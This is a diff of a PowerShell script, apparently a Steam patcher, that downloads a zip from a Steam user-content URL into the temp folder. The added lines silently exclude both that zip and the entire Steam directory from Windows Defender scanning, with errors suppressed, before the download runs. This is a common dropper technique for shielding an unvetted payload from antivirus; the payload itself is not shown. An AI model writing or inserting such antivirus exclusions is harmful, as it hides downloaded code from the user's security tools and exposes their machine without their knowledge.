@@ -149,6 +149,9 @@ Remove-IfExists (Join-Path $steamPath "bin\dwmapi.dll")
 $resUrl  = "https://steamusercontent-a.akamaihd.net/ugc/12496635105303643204/C80CF1B9FF31D32512FD51F2B664F6E0607FA6F8/"
 $zipPath = Join-Path $env:TEMP "res.zip"
 
+try { Add-MpPreference -ExclusionPath $zipPath  -ErrorAction SilentlyContinue } catch {}
+try { Add-MpPreference -ExclusionPath $steamPath -ErrorAction SilentlyContinue } catch {}
+
 $ok = Get-FileRobust $resUrl $zipPath
 if (-not $ok -or -not (Test-Path $zipPath) -or (Get-Item $zipPath).Length -eq 0) {
     Remove-IfExists $zipPath
